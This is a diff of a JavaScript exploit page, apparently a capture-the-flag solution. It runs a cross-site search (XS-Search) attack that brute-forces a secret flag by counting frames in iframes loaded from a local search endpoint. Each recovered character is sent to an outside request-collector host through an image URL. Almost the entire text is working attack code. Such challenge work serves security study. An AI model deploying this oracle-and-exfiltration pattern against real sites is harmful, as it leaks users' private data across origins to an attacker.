@@ -1,44 +1,56 @@
 <iframe id="iframe"></iframe>
 <img id="img">
 <script>
-    async function req(url) {
-        return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-            iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
-                    return resolve();
-                else
-                    return reject();
+    async function search(query){
+        return new Promise((resolve, reject)=>{
+            let iframe = document.createElement("iframe");
+            iframe.src = "http://127.0.0.1:8000/search?query=" + query;
+            document.body.appendChild(iframe);
+
+            iframe.onload = () => {
+                try{
+                    let result = iframe.contentWindow.frames.length;
+                    document.body.removeChild(iframe);
+                    resolve(result > 0);
+                }
+                catch(e){
+                    document.body.removeChild(iframe);
+                    resolve(false);
+                }
             };
+
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                resolve(false);
+            }, 1000); // 1초 타임아웃 설정
         });
     }
 
-    async function search(query) {
-        try {
-            await req(
-              `http://localhost:8000/search?query=${query}`
-            );
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async function exploit() {
-        let chars = "0123456789abcdef}"
+    async function exploit(){
+        let chars = "0123456789abcdef}";
         let secret = "DH{";
 
-        while (!secret.includes("}")) {
-            for (let c of chars) {
-                if (await search(secret + c)) {
-                    secret += c;
-                    img.src = `https://gmfwnsc.request.dreamhack.games/${secret}`;
+        while(!secret.includes("}")){
+            let promise = chars.split("").map(c => search(secret + c).then(result => ({char: c, success: result})));
+            let results = await Promise.all(promise);
+
+            let found = false;
+
+            for (let rslt of results){
+                if(rslt.success){
+                    secret += rslt.char;
+                    found = true;
+                    img.src = `https://oczkhvm.request.dreamhack.games/${secret}`;
                     break;
                 }
+            }
+
+            if(!found){
+                throw new Error("Not found");
+                img.src = `https://oczkhvm.request.dreamhack.games/failed`;
             }
         }
     }
 
-    exploit();
+    exploit()
 </script>
